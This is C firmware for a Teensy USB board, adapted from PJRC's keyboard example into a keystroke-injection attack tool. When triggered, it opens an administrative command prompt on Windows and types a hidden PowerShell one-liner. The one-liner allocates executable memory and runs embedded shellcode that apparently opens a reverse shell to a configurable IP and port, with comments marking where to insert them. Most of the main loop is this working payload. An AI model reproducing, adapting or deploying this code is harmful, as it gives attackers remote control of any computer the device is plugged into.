
/* Keyboard example for Teensy USB Development Board
 * http://www.pjrc.com/teensy/usb_keyboard.html
 * Copyright (c) 2008 PJRC.COM, LLC
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

#include <avr/io.h>
#include <avr/pgmspace.h>
#include <avr/interrupt.h>
#include <util/delay.h>
#include "usb_keyboard.h"

#define LED_CONFIG	(DDRD |= (1<<6))
#define LED_ON		(PORTD &= ~(1<<6))
#define LED_OFF		(PORTD |= (1<<6))
#define CPU_PRESCALE(n)	(CLKPR = 0x80, CLKPR = (n))

uint8_t number_keys[10]=
	{KEY_0,KEY_1,KEY_2,KEY_3,KEY_4,KEY_5,KEY_6,KEY_7,KEY_8,KEY_9};

uint16_t idle_count=0;

int main(void)
{
	uint8_t b, d, mask, i, reset_idle;
	uint8_t b_prev=0xFF, d_prev=0xFF;

	// set for 16 MHz clock
	CPU_PRESCALE(0);

	// Configure all port B and port D pins as inputs with pullup resistors.
	// See the "Using I/O Pins" page for details.
	// http://www.pjrc.com/teensy/pins.html
	DDRD = 0x00;
	DDRB = 0x00;
	PORTB = 0xFF;
	PORTD = 0xFF;

	// Initialize the USB, and then wait for the host to set configuration.
	// If the Teensy is powered without a PC connected to the USB port,
	// this will wait forever.
	usb_init();
	while (!usb_configured()) /* wait */ ;

	// Wait an extra second for the PC's operating system to load drivers
	// and do whatever it does to actually be ready for input
	_delay_ms(1000);

	// Configure timer 0 to generate a timer overflow interrupt every
	// 256*1024 clock cycles, or approx 61 Hz when using 16 MHz clock
	// This demonstrates how to use interrupts to implement a simple
	// inactivity timeout.
	TCCR0A = 0x00;
	TCCR0B = 0x05;
	TIMSK0 = (1<<TOIE0);

	while (1) {
		// read all port B and port D pins
		b = PINB;
		d = PIND;
		// check if any pins are low, but were high previously
		mask = 1;
		reset_idle = 0;
		for (i=0; i<8; i++) {
		if (((b & mask) == 0) && (b_prev & mask) != 0) {
			
				reset_idle = 1;
			}
			
			if (((d & mask) == 0) && (d_prev & mask) != 0) {
				keyboard_modifier_keys = 0;
				keyboard_keys[0] = 0;
				keyboard_keys[1] = 0;
				keyboard_keys[2] = 0;
				keyboard_keys[3] = 0;
				keyboard_keys[4] = 0;
				keyboard_keys[5] = 0;
				
				int currCapsState = capsIsOn();
				while (currCapsState == capsIsOn()){
					keyboard_keys[0] = KEY_CAPS_LOCK;
					usb_keyboard_send();
					keyboard_keys[0] = 0;
					usb_keyboard_send();
					_delay_ms(200);
				}
				if (capsIsOn() == 1){
				//if caps is on, toggle it
					keyboard_keys[0] = KEY_CAPS_LOCK;
					usb_keyboard_send();
					keyboard_keys[0] = 0;
					usb_keyboard_send();
				}
				// press WINKEY + X
				keyboard_modifier_keys = KEY_RIGHT_GUI;
				keyboard_keys[0] = KEY_X;
				keyboard_keys[1] = 0;
				keyboard_keys[2] = 0;
				keyboard_keys[3] = 0;
				keyboard_keys[4] = 0;
				keyboard_keys[5] = 0;
				usb_keyboard_send();
				_delay_ms(800);

				//release
				keyboard_modifier_keys = 0;
				keyboard_keys[0] = 0;
				usb_keyboard_send();
				
				sendString("a");
				//sendString("notepad.exe");
				_delay_ms(2000);

				keyboard_keys[0] = KEY_LEFT;
				usb_keyboard_send();

				keyboard_modifier_keys = 0;
				keyboard_keys[0] = 0;
				usb_keyboard_send();

				keyboard_keys[0] = KEY_ENTER;
				usb_keyboard_send();

				keyboard_modifier_keys = 0;
				keyboard_keys[0] = 0;
				usb_keyboard_send();

				_delay_ms(3000);
				
				/*
				char cmd2[] = "if exist C:\\Windows\\SysWOW64 ( set PWRSHLXDD=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell) else ( set PWRSHLXDD=powershell )";

				sendString(cmd2);
				*/
				sendString("if exist C:\\Windows\\SysWOW64 ( set PWRSHLXDD=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell) else ( set PWRSHLXDD=powershell )");
				keyboard_keys[0] = KEY_ENTER;
				usb_keyboard_send();

				keyboard_modifier_keys = 0;
				keyboard_keys[0] = 0;
				usb_keyboard_send();
				
				sendString("%PWRSHLXDD% -nop -w hidden -c \"$1 = '$c = ''");
    				sendString("[DllImport(\\\"kernel32.dll\\\")]public static ext");
    				sendString("ern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwS");
    				sendString("ize, uint flAllocationType, uint flProtect);[DllIm");
    				sendString("port(\\\"kernel32.dll\\\")]public static extern In");
    				sendString("tPtr CreateThread(IntPtr lpThreadAttributes, uint ");
    				sendString("dwStackSize, IntPtr lpStartAddress, IntPtr lpParam");
    				sendString("eter, uint dwCreationFlags, IntPtr lpThreadId);[Dl");
    				sendString("lImport(\\\"msvcrt.dll\\\")]public static extern I");
    				sendString("ntPtr memset(IntPtr dest, uint src, uint count);''");
    				sendString(";$w = Add-Type -memberDefinition $c -Name \\\"Win3");
    				sendString("2\\\" -namespace Win32Functions -passthru;[Byte[]]");
    				sendString(";[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,");
    				sendString("0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,");
    				sendString("0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,");
    				sendString("0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,");
    				sendString("0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,");
    				sendString("0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,");
    				sendString("0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,");
    				sendString("0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,");
    				sendString("0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,");
    				sendString("0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,");
    				sendString("0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,");
    				sendString("0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,");
    				sendString("0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,");
    				sendString("0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,");
    				sendString("0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,");
    				sendString("0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,");
    				sendString("0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,");
    				sendString("0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,");
    				sendString("0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,");
    				sendString("0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,");
				
				//INSERT IP (IN HEX) HERE
				sendString("0xC0,0xA8,0x02,0x67,");

				sendString("0x68,0x02,0x00,");
				//INSERT PORT (IN HEX) HERE
				sendString("0x11,0x5C,0");

				sendString("x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0");
    				sendString("x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0");
    				sendString("x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0");
    				sendString("x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0");
    				sendString("xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0");
    				sendString("x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0");
    				sendString("xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0");
    				sendString("xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0");
    				sendString("xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -");
    				sendString("gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc");
    				sendString("(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length");
    				sendString("-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $");
    				sendString("sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;");
    				sendString("){Start-sleep 60};';$gq = [System.Convert]::ToBase");
    				sendString("64String([System.Text.Encoding]::Unicode.GetBytes(");
    				sendString("$1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRo");
    				sendString("ot + \\\"\\\\syswow64\\\\WindowsPowerShell\\\\v1.0");
    				sendString("\\\\powershell\\\";$cmd = \\\"-nop -noni -enc \\\"");
    				sendString(";iex \\\" $x86 $cmd $gq\\\"}else{$cmd = \\\"-nop -");
    				sendString("noni -enc\\\";iex \\\" powershell $cmd $gq\\\";}\"");
				
				keyboard_keys[0] = KEY_ENTER;
				usb_keyboard_send();

				keyboard_modifier_keys = 0;
				keyboard_keys[0] = 0;
				usb_keyboard_send();
								
				reset_idle = 1;
			}
			mask = mask << 1;
		}
		// if any keypresses were detected, reset the idle counter
		if (reset_idle) {
			// variables shared with interrupt routines must be
			// accessed carefully so the interrupt routine doesn't
			// try to use the variable in the middle of our access
			cli();
			idle_count = 0;
			sei();
		}
		// now the current pins will be the previous, and
		// wait a short delay so we're not highly sensitive
		// to mechanical "bounce".
		b_prev = b;
		d_prev = d;
		_delay_ms(2);
	}
}

int capsIsOn(){
	if ((keyboard_leds & 2) > 0){
		return 1;
	}
	return 0;
}

void sendString(char word[]){
	keyboard_modifier_keys = 0;
	int i;
	for (i = 0; word[i] != 0; i++){
		int currChr = (int)word[i];
		if (currChr == 37){ // %
			keyboard_keys[0] = KEY_5;
			keyboard_modifier_keys = KEY_SHIFT;
		}
		else if (currChr >= 65 && currChr <= 90) { // capital letter
			keyboard_keys[0] = currChr - 61;
			keyboard_modifier_keys = KEY_SHIFT;
		}
		else if (currChr == 45) keyboard_keys[0] = KEY_MINUS; // -
		else if (currChr >= 97 && currChr <= 122) keyboard_keys[0] = currChr - 93; // lowercase letter
		else if (currChr == 34){ // "
			keyboard_keys[0] = KEY_QUOTE;
			keyboard_modifier_keys = KEY_SHIFT;
		}
		else if (currChr == 39) keyboard_keys[0] = KEY_QUOTE; // '
		else if (currChr == 91) keyboard_keys[0] = KEY_LEFT_BRACE; // [
		else if (currChr == 93) keyboard_keys[0] = KEY_RIGHT_BRACE; // ]
		else if (currChr == 40){ // (
			keyboard_keys[0] = KEY_9;
			keyboard_modifier_keys = KEY_SHIFT;
		}
		else if (currChr == 41){ // )
			keyboard_keys[0] = KEY_0;
			keyboard_modifier_keys = KEY_SHIFT;
		}
		else if (currChr == 92) keyboard_keys[0] = KEY_BACKSLASH; // backslash
		else if (currChr == 47) keyboard_keys[0] = KEY_SLASH;		
		else if (currChr == 46) keyboard_keys[0] = KEY_PERIOD;
		else if (currChr == 32) keyboard_keys[0] = KEY_SPACE; //space
		else if (currChr >= 49 && currChr <= 57) keyboard_keys[0] = currChr - 19; //numbers 1-9
		else if (currChr == 48) keyboard_keys[0] = KEY_0; //0, because magic
		else if (currChr == 44) keyboard_keys[0] = KEY_COMMA;
		else if (currChr == 59) keyboard_keys[0] = KEY_SEMICOLON;
		else if (currChr == 36){ // $
			keyboard_keys[0] = KEY_4;
			keyboard_modifier_keys = KEY_SHIFT;
		}
		else if (currChr == 58){ // :
			keyboard_keys[0] = KEY_SEMICOLON;
			keyboard_modifier_keys = KEY_SHIFT;
		}
		else if (currChr == 61) keyboard_keys[0] = KEY_EQUAL;
		else if (currChr == 123){
			keyboard_keys[0] = KEY_LEFT_BRACE;
			keyboard_modifier_keys = KEY_SHIFT;
		}
		else if (currChr == 125){
			keyboard_keys[0] = KEY_RIGHT_BRACE;
			keyboard_modifier_keys = KEY_SHIFT;
		}
		else if (currChr == 43){
			keyboard_keys[0] = KEY_EQUAL;
			keyboard_modifier_keys = KEY_SHIFT;
		}
		usb_keyboard_send();
		keyboard_keys[0] = 0;
		keyboard_modifier_keys = 0;
		usb_keyboard_send();
	}
}

// This interrupt routine is run approx 61 times per second.
// A very simple inactivity timeout is implemented, where we
// will send a space character.
ISR(TIMER0_OVF_vect)
{
	idle_count++;
	if (idle_count > 61 * 8) {
		idle_count = 0;
	}
}


